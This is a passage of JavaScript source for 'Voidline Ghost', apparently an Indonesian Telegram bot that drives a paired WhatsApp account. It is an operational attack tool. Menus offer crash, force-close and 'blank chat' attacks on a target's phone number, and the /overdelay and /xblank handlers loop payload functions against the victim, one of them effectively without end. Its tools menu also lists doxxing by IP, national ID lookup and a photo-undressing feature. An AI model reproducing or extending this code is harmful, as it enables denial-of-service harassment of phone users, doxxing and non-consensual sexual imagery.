      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `
<blockquote><b> ⬡═―—⊱ ⎧ 𝗩𝗢𝗜𝗗𝗟𝗜𝗡𝗘 𝗚𝗛𝗢𝗦𝗧 ⎭ ⊰―—═⬡ 
⛧ Number: ${lastPairingMessage.phoneNumber}
⛧ Pairing Code: ${lastPairingMessage.pairingCode}
⛧ Status: Connected
</b></blockquote>`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("setcd", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("killsesi", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

// Command addadmin
bot.command("addadmin", async (ctx) => {

    if (ctx.from.id != ownerID && !isOwner(ctx.from.id.toString())) {
        return ctx.reply("❌ ☇ Akses hanya untuk owner atau owner utama");
    }

  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("🪧 ☇ Format: /addadmin 12345678");
  }

  const userId = args[1];
  const success = addAdminUser(userId);

  // Respon hasil
  if (success) {
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai Admin`);
  } else {
    ctx.reply(`⚠️ ☇ ${userId} sudah jadi Admin sebelumnya`);
  }
});

// Command deladmin
bot.command("deladmin", async (ctx) => {

    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk owner");
    }
    

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /deladmin 12345678");
    }

    const userId = args[1];
    const success = delAdminUser(userId);

    if (success) {
        ctx.reply(`✅ ☇ ${userId} berhasil dicabut dari Admin`);
    } else {
        ctx.reply(`⚠️ ☇ ${userId} bukan Admin`);
    }
});

const fsp = fs.promises;
// ================== LOAD CONFIG FROM update.js (NO CACHE) ==================
function loadUpdateConfig() {
  try {
    // pastikan ambil dari root project (process.cwd()), bukan lokasi file lain
    const cfgPath = path.join(process.cwd(), "update.js");

    // hapus cache require biar selalu baca update.js terbaru setelah restart/update
    try {
      delete require.cache[require.resolve(cfgPath)];
    } catch (_) {}

    const cfg = require(cfgPath);
    return (cfg && typeof cfg === "object") ? cfg : {};
  } catch (e) {
    return {};
  }
}

const UPD = loadUpdateConfig();

// ====== CONFIG ======
const GITHUB_OWNER = UPD.github_owner || "name gh";
const DEFAULT_REPO = UPD.github_repo_default || "name repo";
const GITHUB_BRANCH = UPD.github_branch || "main";
const UPDATE_FILE_IN_REPO = UPD.update_file_in_repo || "index.js";

// token untuk WRITE (add/del)
const GITHUB_TOKEN_WRITE = UPD.github_token_write || "";

// target lokal yang bakal diganti oleh /update
const LOCAL_TARGET_FILE = path.join(process.cwd(), "index.js");

// ================== FETCH HELPER ==================
const fetchFn = global.fetch || ((...args) => import("node-fetch").then(({ default: f }) => f(...args)));

// ================== FILE WRITE ATOMIC ==================
async function atomicWriteFile(targetPath, content) {
  const dir = path.dirname(targetPath);
  const tmp = path.join(dir, `.update_tmp_${Date.now()}_${path.basename(targetPath)}`);
  await fsp.writeFile(tmp, content, { encoding: "utf8" });
  await fsp.rename(tmp, targetPath);
}

// ================== READ (PUBLIC): DOWNLOAD RAW ==================
async function ghDownloadRawPublic(repo, filePath) {
  const rawUrl =
    `https://raw.githubusercontent.com/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/${encodeURIComponent(GITHUB_BRANCH)}/${filePath}`;

  const res = await fetchFn(rawUrl, { headers: { "User-Agent": "telegraf-update-bot" } });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`Gagal download ${filePath} (${res.status}): ${txt || res.statusText}`);
  }
  return await res.text();
}

// ================== WRITE (BUTUH TOKEN): GITHUB API ==================
function mustWriteToken() {
  if (!GITHUB_TOKEN_WRITE) {
    throw new Error("Token WRITE kosong. Isi github_token_write di update.js (Contents: Read and write).");
  }
}

function ghWriteHeaders() {
  mustWriteToken();
  return {
    Authorization: `Bearer ${GITHUB_TOKEN_WRITE}`,
    Accept: "application/vnd.github+json",
    "X-GitHub-Api-Version": "2022-11-28",
    "User-Agent": "telegraf-gh-writer",
  };
}

async function ghGetContentWrite(repo, filePath) {
  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/contents/${encodeURIComponent(filePath)}?ref=${encodeURIComponent(GITHUB_BRANCH)}`;

  const res = await fetchFn(url, { headers: ghWriteHeaders() });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub GET ${res.status}: ${txt || res.statusText}`);
  }
  return res.json();
}

async function ghPutFileWrite(repo, filePath, contentText, commitMsg) {
  let sha;
  try {
    const existing = await ghGetContentWrite(repo, filePath);
    sha = existing?.sha;
  } catch (e) {
    if (!String(e.message).includes(" 404")) throw e; // 404 => create baru
  }

  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/contents/${encodeURIComponent(filePath)}`;

  const body = {
    message: commitMsg,
    content: Buffer.from(contentText, "utf8").toString("base64"),
    branch: GITHUB_BRANCH,
    ...(sha ? { sha } : {}),
  };

  const res = await fetchFn(url, {
    method: "PUT",
    headers: { ...ghWriteHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub PUT ${res.status}: ${txt || res.statusText}`);
  }

  return res.json();
}

async function ghDeleteFileWrite(repo, filePath, commitMsg) {
  const info = await ghGetContentWrite(repo, filePath);
  const sha = info?.sha;
  if (!sha) throw new Error("SHA tidak ketemu. Pastikan itu file (bukan folder).");

  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/contents/${encodeURIComponent(filePath)}`;

  const body = { message: commitMsg, sha, branch: GITHUB_BRANCH };

  const res = await fetchFn(url, {
    method: "DELETE",
    headers: { ...ghWriteHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub DELETE ${res.status}: ${txt || res.statusText}`);
  }

  return res.json();
}

// ================== COMMANDS ==================

// /update [repoOptional]
// download update_index.js -> replace local index.js -> restart
bot.command("autoupdate", async (ctx) => {
  try {
    const parts = (ctx.message.text || "").trim().split(/\s+/);
    const repo = parts[1] || DEFAULT_REPO;

    await ctx.reply("🔄 Bot akan update otomatis.\n♻️ Tunggu proses 1–3 menit...");
    await ctx.reply(`⬇️ Mengambil update dari GitHub: *${repo}/${UPDATE_FILE_IN_REPO}* ...`, { parse_mode: "Markdown" });

    const newCode = await ghDownloadRawPublic(repo, UPDATE_FILE_IN_REPO);

    if (!newCode || newCode.trim().length < 50) {
      throw new Error("File update terlalu kecil/kosong. Pastikan update_index.js bener isinya.");
    }

    // backup index.js lama
    try {
      const backup = path.join(process.cwd(), "index.backup.js");
      await fsp.copyFile(LOCAL_TARGET_FILE, backup);
    } catch (_) {}

    await atomicWriteFile(LOCAL_TARGET_FILE, newCode);

    await ctx.reply("✅ Update berhasil diterapkan.\n♻️ Restarting panel...");

    setTimeout(() => process.exit(0), 3000);
  } catch (err) {
    await ctx.reply(`❌ Update gagal: ${err.message || String(err)}`);
  }
});

// /addfiles <repo> (reply file .js)
bot.command("addfile", async (ctx) => {
  try {
    const parts = (ctx.message.text || "").trim().split(/\s+/);
    const repo = parts[1] || DEFAULT_REPO;

    const replied = ctx.message.reply_to_message;
    const doc = replied?.document;

    if (!doc) {
      return ctx.reply("❌ Reply file .js dulu, lalu ketik:\n/addfiles <namerepo>\nContoh: /addfiles Pullupdate");
    }

    const fileName = doc.file_name || "file.js";
    if (!fileName.endsWith(".js")) return ctx.reply("❌ File harus .js");

    await ctx.reply(`⬆️ Uploading *${fileName}* ke repo *${repo}*...`, { parse_mode: "Markdown" });

    const link = await ctx.telegram.getFileLink(doc.file_id);
    const res = await fetchFn(link.href);
    if (!res.ok) throw new Error(`Gagal download file telegram: ${res.status}`);

    const contentText = await res.text();

    await ghPutFileWrite(repo, fileName, contentText, `Add/Update ${fileName} via bot`);

    await ctx.reply(`✅ Berhasil upload *${fileName}* ke repo *${repo}*`, { parse_mode: "Markdown" });
  } catch (err) {
    await ctx.reply(`❌ Gagal: ${err.message || String(err)}`);
  }
});

// /delfiles <repo> <path/file.js>
bot.command("dellfile", async (ctx) => {
  try {
    const parts = (ctx.message.text || "").trim().split(/\s+/);
    const repo = parts[1] || DEFAULT_REPO;
    const file = parts[2];

    if (!file) {
      return ctx.reply("Format:\n/delfiles <namerepo> <namefiles>\nContoh: /delfiles Pullupdate index.js");
    }

    await ctx.reply(`🗑️ Menghapus *${file}* di repo *${repo}*...`, { parse_mode: "Markdown" });

    await ghDeleteFileWrite(repo, file, `Delete ${file} via bot`);

    await ctx.reply(`✅ Berhasil hapus *${file}* di repo *${repo}*`, { parse_mode: "Markdown" });
  } catch (err) {
    await ctx.reply(`❌ Gagal: ${err.message || String(err)}`);
  }
});
  
// ====== /restart ======
bot.command("restart", async (ctx) => {
  await ctx.reply("♻️ Panel akan *restart manual* untuk menjaga kestabilan...");

  // kirim status ke grup utama kalau ada
  try {
    if (typeof sendToGroupsUtama === "function") {
      sendToGroupsUtama(
        "🟣 *Status Panel:*\n♻️ Panel akan *restart manual* untuk menjaga kestabilan...",
        { parse_mode: "Markdown" }
      );
    }
  } catch (e) {}

  setTimeout(() => {
    try {
      if (typeof sendToGroupsUtama === "function") {
        sendToGroupsUtama(
          "🟣 *Status Panel:*\n✅ Panel berhasil restart dan kembali aktif!",
          { parse_mode: "Markdown" }
        );
      }
    } catch (e) {}
  }, 8000);

  setTimeout(() => process.exit(0), 5000);
});

bot.command('addprem', async (ctx) => {    
    const senderId = ctx.from.id.toString()

    let adminList = []
    try {
        adminList = JSON.parse(fs.readFileSync('./admin.json'))
    } catch (e) {
        adminList = []
    }

    if (senderId != ownerID.toString() && !adminList.includes(senderId)) {    
        return ctx.reply("❌ ☇ Akses hanya untuk owner atau admin");    
    }    

    const args = ctx.message.text.split(" ");    
    if (args.length < 3) {    
        return ctx.reply("🪧 ☇ Format: /addprem 12345678 30");    
    }    

    const userId = args[1];    
    const duration = parseInt(args[2]);    

    if (isNaN(duration)) {    
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");    
    }    

    const expiryDate = addpremUser(userId, duration);    

    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);    
});

bot.command('delprem', async (ctx) => {
    const senderId = ctx.from.id.toString()

    let adminList = []
    try {
        adminList = JSON.parse(fs.readFileSync('./admin.json'))
    } catch (e) {
        adminList = []
    }

    if (senderId != ownerID.toString() && !adminList.includes(senderId)) {
        return ctx.reply("❌ ☇ Akses hanya untuk owner atau admin");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678");
    }

    const userId = args[1];

    removePremiumUser(userId);

    ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

const GROUP_FILE = "グループのみ.json";

let GROUP_ONLY = false;

if (fs.existsSync(GROUP_FILE)) {
  try {
    const data = JSON.parse(fs.readFileSync(GROUP_FILE));
    GROUP_ONLY = data.groupOnly || false;
  } catch (err) {
    console.error("Error membaca file グループのみ.json:", err);
  }
}

function saveGroupOnlyStatus() {
  fs.writeFileSync(
    GROUP_FILE,
    JSON.stringify({ groupOnly: GROUP_ONLY }, null, 2)
  );
}

bot.command("grouponly", async (ctx) => {
  try {

    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Perintah ini hanya untuk Owner!");
    }

    const args = ctx.message.text.split(" ").slice(1);
    const mode = (args[0] || "").toLowerCase();

    if (!["on", "off"].includes(mode)) {
      return await ctx.reply(
        "⚠️ Format salah!\nGunakan:\n/grouponly on\n/grouponly off"
      );
    }

    GROUP_ONLY = mode === "on";

    if (typeof saveGroupOnlyStatus === "function") {
      saveGroupOnlyStatus();
    }

    const statusText = GROUP_ONLY
      ? "🟢 ON (Group Only)"
      : "🔴 OFF (Private Allowed)";

    await ctx.replyWithHTML(
`⚙️ <b>GROUP ONLY MODE</b>

Status: <b>${statusText}</b>`
    );

  } catch (err) {
    console.error("Error grouponly:", err);
    await ctx.reply("❌ Terjadi kesalahan saat menjalankan perintah.");
  }
});

bot.start(async (ctx) => {  
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";  
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";  
    const runtimeStatus = formatRuntime();  
    const memoryStatus = formatMemory();  
    const cooldownStatus = loadCooldown();  
    const senderId = ctx.from.id;  
    const userTag = ctx.from.username ? "@" + ctx.from.username : ctx.from.first_name;  
    

    if (!checkGroupOnly(ctx)) return;

    const menuMessage = `  
(⸙) ɦเ เɱ νσι∂ℓιηє gнσѕт
<blockquote>{VðïÐïlïñê Ghð§†} Olaa ${userTag}</blockquote>
ᴛᴇʀɪᴍᴀᴋᴀꜱɪʜ ᴛᴇʟᴀʜ ꜱᴇᴛɪᴀ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ᴠᴏɪᴅʟɪɴᴇ ɢʜᴏꜱᴛ. 
ꜱᴇʟᴀʟᴜ ɴᴀɴᴛɪᴋᴀɴ, ɪɴꜰᴏ, ᴘʀᴏᴊᴇᴄᴛ ᴅᴀʀɪ ᴋᴀᴍɪ⎙
<blockquote>⬡═―⊱ ⎧ 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 ⎭ ⊰—═⬡</blockquote>
◉ ᴀᴜᴛʜᴏʀ : @thezarxx
◉ ᴠᴇʀꜱɪᴏɴ : 5.0
◉ ʟᴀɴɢᴜᴀɢᴇ : ᴊᴀᴠᴀꜱᴄʀɪᴘᴛ
<blockquote>⬡═―⊱ ⎧ 𝚂𝚃𝙰𝚃𝚄𝚂 𝙱𝙾𝚃 ⎭ ⊰—═⬡</blockquote>
◉ ʀᴜɴᴛɪᴍᴇ : ${runtimeStatus}
◉ ᴀᴄᴄᴇꜱꜱ : ${premiumStatus}  
◉ ꜱᴛᴀᴛᴜꜱ ꜱᴇɴᴅᴇʀ : ${senderStatus} 
◉ ᴜꜱᴇʀ-ɪᴅ : ${senderId}
<blockquote>ⓘ 𝚂𝚎𝚕𝚕𝚎𝚌𝚝 𝚃𝚑𝚎 𝙼𝚎𝚗𝚞 𝙱𝚞𝚝𝚝𝚘𝚗 𝙱𝚎𝚕𝚘𝚠</blockquote> 
`;  

    const keyboard = [
    [
       {
            text: "ᖫ ⟸ ʙᴀᴄᴋ ᖭ",
            callback_data: "/backpanel"
        },
        {
            text: "⌜ Dҽʋҽʅσρҽɾ ⌟",
            url: "https://t.me/thezarxx"
        },
        {
            text: "ᖫ ɴᴇxᴛ ⟹ ᖭ",
            callback_data: "/controls"
        }
    ]
];

  ctx.replyWithPhoto(thumbnailUrl, {
        caption: menuMessage,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
});  

bot.action('/start', async (ctx) => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    const senderId = ctx.from.id;
    const userTag = ctx.from.username ? "@" + ctx.from.username : ctx.from.first_name;
    
  if (!checkGroupOnly(ctx)) return;
  
    const menuMessage = `
(⸙) ɦเ เɱ νσι∂ℓιηє gнσѕт
<blockquote>{VðïÐïlïñê Ghð§†} Olaa ${userTag}</blockquote>
ᴛᴇʀɪᴍᴀᴋᴀꜱɪʜ ᴛᴇʟᴀʜ ꜱᴇᴛɪᴀ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ᴠᴏɪᴅʟɪɴᴇ ɢʜᴏꜱᴛ. 
ꜱᴇʟᴀʟᴜ ɴᴀɴᴛɪᴋᴀɴ, ɪɴꜰᴏ, ᴘʀᴏᴊᴇᴄᴛ ᴅᴀʀɪ ᴋᴀᴍɪ⎙
<blockquote>⬡═―⊱ ⎧ 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 ⎭ ⊰—═⬡</blockquote>
◉ ᴀᴜᴛʜᴏʀ : @thezarxx
◉ ᴠᴇʀꜱɪᴏɴ : 5.0
◉ ʟᴀɴɢᴜᴀɢᴇ : ᴊᴀᴠᴀꜱᴄʀɪᴘᴛ
<blockquote>⬡═―⊱ ⎧ 𝚂𝚃𝙰𝚃𝚄𝚂 𝙱𝙾𝚃 ⎭ ⊰—═⬡</blockquote>
◉ ʀᴜɴᴛɪᴍᴇ : ${runtimeStatus}
◉ ᴀᴄᴄᴇꜱꜱ : ${premiumStatus}  
◉ ꜱᴛᴀᴛᴜꜱ ꜱᴇɴᴅᴇʀ : ${senderStatus} 
◉ ᴜꜱᴇʀ-ɪᴅ : ${senderId}
<blockquote>ⓘ 𝚂𝚎𝚕𝚕𝚎𝚌𝚝 𝚃𝚑𝚎 𝙼𝚎𝚗𝚞 𝙱𝚞𝚝𝚝𝚘𝚗 𝙱𝚎𝚕𝚘𝚠</blockquote> 
`;

    const keyboard = [
    [
       {
            text: "ᖫ ⟸ ʙᴀᴄᴋ ᖭ",
            callback_data: "/backpanel"
        },
        {
            text: "⌜ Dҽʋҽʅσρҽɾ ⌟",
            url: "https://t.me/XavienZzTamvan"
        },
        {
            text: "ᖫ ɴᴇxᴛ ⟹ ᖭ",
            callback_data: "/controls"
            }
        ]
    ];

    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "HTML",
        }, {
            reply_markup: { inline_keyboard: keyboard }
        });

    } catch (error) {
        if (
            error.response &&
            error.response.error_code === 400 &&
            error.response.description.includes("メッセージは変更されませんでした")
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error saat mengirim menu:", error);
        }
    }
});

bot.action("/backpanel", async (ctx) => {
    try {
        await ctx.answerCbQuery("🔄 Panel sedang direstart...\nSession akan terhapus..", {
            show_alert: false
        });

        const sessionPath = path.join(__dirname, "session");

        if (fs.existsSync(sessionPath)) {
            fs.rmSync(sessionPath, { recursive: true, force: true });
        }

        setTimeout(() => {
            process.exit(1);
        }, 1500);

    } catch (err) {
        console.error("Error restart panel:", err);
        await ctx.answerCbQuery("❌ Gagal restart panel.", {
            show_alert: true
        });
    }
});

bot.action('/controls', async (ctx) => {
    const controlsMenu = `
<blockquote><pre>⬡═━━【CONTROL MENU】━━═⬡</pre></blockquote>
⌬ /addprem - Id ☇ Days
╰⊱ |[ Menambah Akses Premium ]|
⌬ /delprem - Id
╰⊱ |[ Menghapus Akses Premium ]|
⌬ /addadmin - Id
╰⊱ |[ Menambah Akses Admin ]|
⌬ /deladmin - Id
╰⊱ |[ Menghapus Akses Admin ]|
⌬ /grouponly - On|Off
╰⊱ |[ Control Group Only ]|
⌬ /reqpair - 62xx
╰⊱ |[ Pairing WhatsApp ]|
⌬ /setcd - 5m
╰⊱ |[ Mengatur Cooldown ]|
⌬ /killsesi
╰⊱ |[ Reset Session ]|
<blockquote>╘═─────────────────═▣</blockquote>
`;

    const keyboard = [
  [ 
    { text: "ᖫ ⟸ ʙᴀᴄᴋ ᖭ", callback_data: "/start" },
    { text: "ᖫ ɴᴇxᴛ ⟹ ᖭ", callback_data: "/bug" }
  ]
];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/bug', async (ctx) => {
    const bugMenu = `
<blockquote><pre>⬡═━━【BUG OPTIONS】━━═⬡</pre></blockquote>
⌬ /overdelay ✆ 628xx 
╰⊱ |[ Delay Invisible Hard ]|
⌬ /xdocu ✆ 628xx
╰⊱ |[ Delay For Murbug ]|
⌬ /xblank ✆ 628xx
╰⊱ |[ Blank Chat Andro ]|
⌬ /xplor ✆ 628xx
╰⊱ |[ Blank Ios ]|
⌬ /xpler ✆ 628xx
╰⊱ |[ Fc Bebas Spam ]|
⌬ /forclose ✆ 628xx
╰⊱ |[ Fc For Murbug ]|
⌬ /xcrash ✆ 628xx
╰⊱ |[ Crash Invisible Android ]|
⌬ /forcex ✆ 628xx
╰⊱ |[ Forclose X Delay ]|
⌬ /ioskill ✆ 628xx
╰⊱ |[ Crash Invisible iPhone ]|
<blockquote>╘═─────────────────═▣</blockquote>
`;

    const keyboard = [
  [
    { text: "ᖫ ⟸ ʙᴀᴄᴋ ᖭ", callback_data: "/controls" },
    { text: "ᖫ ɴᴇxᴛ ⟹ ᖭ", callback_data: "/tools" }
  ]
];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/tools', async (ctx) => {
    const bugMenu2 = `
<blockquote><pre>⬡═━━【TOOLS MENU】━━═⬡</pre></blockquote>
⌬ /tiktokdl - Input Link
⌬ /tiktoksearch - Input Text
⌬ /nikparse - Input Number NIK
⌬ /doxxingip - Input Number IP
⌬ /ssip - Input Text
⌬ /tourl - Reply Photo/Video
⌬ /cekbio - Number
⌬ /toanime - Reply Photo
⌬ /anime - Input Text Anime
⌬ /tonaked - Reply Photo
⌬ /bokep - Input Text
⌬ /brat - Input Text
⌬ /tofigure - Reply Photo
⌬ /play - Input Text
⌬ /getcode - Input Link
⌬ /testfunction - Reply Function
<blockquote>╘═─────────────────═▣</blockquote>
`;

   const keyboard = [
  [ 
    { text: "ᖫ ⟸ ʙᴀᴄᴋ ᖭ", callback_data: "/bug" },
    { text: "ᖫ ɴᴇxᴛ ⟹ ᖭ", callback_data: "/tqto" }
  ]
];

    try {
        await ctx.editMessageCaption(bugMenu2, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/tqto', async (ctx) => {
    const tqtoMenu = `
<blockquote><pre>╭━━⊱『 THANKS TO 』</pre></blockquote>
ᝰ Zarr ⧼ᴅᴇᴠᴇʟᴏᴘᴇʀ⧽
ᝰ Xwarr ⧼ꜱᴜᴘᴘᴏʀᴛ⧽
ᝰ Xavienzz ⧼ꜱᴜᴘᴘᴏʀᴛ⧽
ᝰ Sirywu ⧼ʙᴇsғʀɪᴇɴᴅ⧽
ᝰ Xatanical ⧼ꜱᴜᴘᴘᴏʀᴛ⧽
ᝰ Otaa ⧼ꜱᴜᴘᴘᴏʀᴛ⧽
ᝰ ᴀʟʟ ʙᴜʏᴇʀ ᴠᴏɪᴅʟɪɴᴇ ɢʜᴏsᴛ
ᝰ ᴀɴᴅ ᴀʟʟ ᴛᴇᴀᴍ ᴠᴏɪᴅʟɪɴᴇ ɢʜᴏꜱᴛ
<blockquote>༺━━━━━━━━━━━━━━━༻</blockquote>
`;

    const keyboard = [
  [
    { text: "ᖫ ʙᴀᴄᴋ ᴛᴏ ᴍᴀɪɴ ᖭ", callback_data: "/start" }
  ]
];

    try {
        await ctx.editMessageCaption(tqtoMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.command("overdelay", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

  if (!checkGroupOnly(ctx)) return;

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /overdelay 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Delay Invisible Hard
│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
│⌑ Progress: ${progressBar(0)}
╰─────────────────────═⬡</pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let p = 10; p <= 100; p += 10) {
    await sleep(600);
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      processMessageId,
      undefined,
      `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Delay Invisible Hard
│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
│⌑ Progress: ${progressBar(p)}
╰─────────────────────═⬡</pre>`,
      { parse_mode: "HTML" }
    );
  }

  for (let i = 0; i < 1000000000000000; i++) {
    await LocaInvis(sock, target);
  }

  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Delay Invisible Hard
│⌑ Status: 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺
│⌑ Progress: ${progressBar(100)}
╰─────────────────────═⬡</pre>`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );
});

bot.command("xblank", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {

  if (!checkGroupOnly(ctx)) return;

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xblank 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Blank Chat Android 
│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
│⌑ Progress: ${progressBar(0)}
╰─────────────────────═⬡</pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ チェック対象", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let p = 10; p <= 100; p += 10) {
    await sleep(600);
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      processMessageId,
      undefined,
      `<pre>╭═―⊱ ⎧ VOIDLINE GHOST ⎭ ⊰―═⬡
│⌑ Target: ${q}
│⌑ Type: Blank Chat Android 
│⌑ Status: 𝘗𝘳𝘰𝘴𝘦𝘴 𝘗𝘦𝘯𝘨𝘪𝘳𝘪𝘮𝘢𝘯 𝘉𝘶𝘨...
│⌑ Progress: ${progressBar(p)}
╰─────────────────────═⬡</pre>`,
      { parse_mode: "HTML" }
    );
  }

  for (let i = 0; i < 10; i++) {
    await JayaBlank(target);
  }

